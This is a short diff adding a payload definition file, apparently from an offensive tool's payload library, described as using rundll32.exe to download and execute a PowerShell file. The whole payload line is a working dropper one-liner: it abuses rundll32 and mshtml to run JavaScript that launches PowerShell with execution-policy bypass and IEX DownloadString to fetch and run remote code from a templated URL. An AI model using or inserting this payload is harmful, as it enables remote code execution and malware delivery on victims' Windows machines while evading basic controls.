@@ -1,0 +1,7 @@
+[Info]
+Author      = Karim shoair (D4Vinci)
+Description = Using rundll32.exe to download and execute a PowerShell file.
+
+[Payload]
+Type     = Dropper
+Payload  = rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('{}');"
